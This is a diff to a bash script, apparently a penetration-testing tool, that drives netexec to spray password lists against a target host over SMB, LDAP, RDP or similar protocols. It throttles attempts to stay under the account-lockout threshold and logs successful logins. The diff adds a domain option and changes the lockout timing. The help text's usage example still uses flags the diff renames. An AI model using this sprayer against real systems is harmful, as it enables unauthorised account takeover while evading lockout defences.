@@ -18,32 +18,34 @@ fi
 help() {
     echo "flags:"
     echo "-t: Target IP address or hostname"
-    echo "-m: Method/Protocol - any protocol netexec can use (SMB, LDAP, RDP, etc.)"
+    echo "-m: Method/protocol - any protocol netexec supports (SMB, LDAP, RDP, etc.)"
     echo "-u: Username or username file"
     echo "-p: Password or password file"
-    echo "-l: Account Lockout Threshold' value"
-    echo "-r: 'Reset Account Lockout Counter After' value"
-    echo "-n: 'Custom port number - optional"
-    echo "-h: 'Print this help summary page"
+    echo "-a: Number of logins attempts per user per interval"
+    echo "-i: Minutes inbetween login intervals"
+    echo "-d: Domain - optional (uses target's default domain otherwise)"
+    echo "-P: Custom port number - optional"
+    echo "-h: Print this help summary page"
     echo ""
     echo "Usage example:"
-    echo "nxcspray-2.sh -t 10.1.1.1 -m smb -u ./users.txt -p ./passwords.txt -l 5 -r 30 -n 445"
+    echo "nxcspray.sh -t 10.1.1.1 -m smb -u ./users.txt -p ./passwords.txt -l 5 -r 30 -d test.local -n 445"
 
 }
 
 
-while getopts t:m:r:l:p:u:n:h: flag
+while getopts t:m:i:a:p:u:P:d:h: flag
 do
     case "${flag}" in
         t) dc_ip=${OPTARG};;
         m) method=${OPTARG};;
-        r) reset_counter=${OPTARG};;
-        l) lockout_threshold=${OPTARG};;
+        i) reset_counter=${OPTARG};;
+        a) lockout_threshold=${OPTARG};;
         u) dom_users=${OPTARG};;
         p) passwords=${OPTARG};;
-        n) port=${OPTARG};;
+        P) port=${OPTARG};;
+	d) domain=${OPTARG};;
         h) help ;;
-        *) echo "Invalid option: -$flag" && echo "" && help && exit 1;;
+        *) echo "" && help && exit 1;;
 
     esac
 done
@@ -77,31 +79,37 @@ checkpwns () {
 }
 
 while true; do
-    # number of passwords to try from the list; lockout_threshold - 1
-    pass_num=$(head -n $(echo $((lockout_threshold-1))) $passwords.tmp)
-    echo "[*] Trying $(echo $((lockout_threshold-1))) passwords every $(echo $((reset_counter+1))) minutes against $(echo $dc_ip) and using $(echo $passwords) and $(echo $dom_users) lists."
+    # number of passwords to try from the list; lockout_threshold
+    pass_num=$(head -n $(echo $((lockout_threshold))) $passwords.tmp)
+    echo "[*] Trying $(echo $((lockout_threshold))) passwords every $(echo $((reset_counter))) minutes against $(echo $dc_ip) and using $(echo $passwords) and $(echo $dom_users) lists."
     sleep 3
     for password in $pass_num; do
         t2='date +"%T"'
         echo "[+] Running:" `$t2`
-	if [[ -z $port ]] 
+	if [[ $domain != "" ]] && [[ $port != "" ]] 
 	  then 
-            netexec $method $dc_ip -u $(cat $dom_users) -p $password 2>/dev/null | tee -a nxcspray_output.txt
+            netexec $method $dc_ip -u $(cat $dom_users) -p $password -d $domain --port $port 2>/dev/null | tee -a nxcspray_output.txt
+	elif [[ $port != "" ]] 
+	  then 
+            netexec $method $dc_ip -u $(cat $dom_users) -p $password --port $port 2>/dev/null | tee -a nxcspray_output.txt
+	elif [[ $domain != "" ]] 
+	  then 
+            netexec $method $dc_ip -u $(cat $dom_users) -p $password -d $domain 2>/dev/null | tee -a nxcspray_output.txt
 	else
-	    netexec $method $dc_ip -u $(cat $dom_users) -p $password --port $port 2>/dev/null | tee -a nxcspray_output.txt
+	    netexec $method $dc_ip -u $(cat $dom_users) -p $password 2>/dev/null | tee -a nxcspray_output.txt
 	fi
 
     done
     # remove used passwords from the list
-    sed -i -e "1,$((lockout_threshold-1))d" $passwords.tmp
+    sed -i -e "1,$((lockout_threshold))d" $passwords.tmp
     checkpwns
     
 	t='date +"%T"'
-	echo "[+] Waiting $(echo $((reset_counter+1))) minutes..."
+	echo "[+] Waiting $(echo $((reset_counter))) minutes..."
 	echo "[+] Last run:" `$t`
 	
 
-    timer=$((reset_counter+1))
+    timer=$((reset_counter))
     sleep $timer"m"
     if [[ ! -s $passwords.tmp ]]; then
         checkpwns
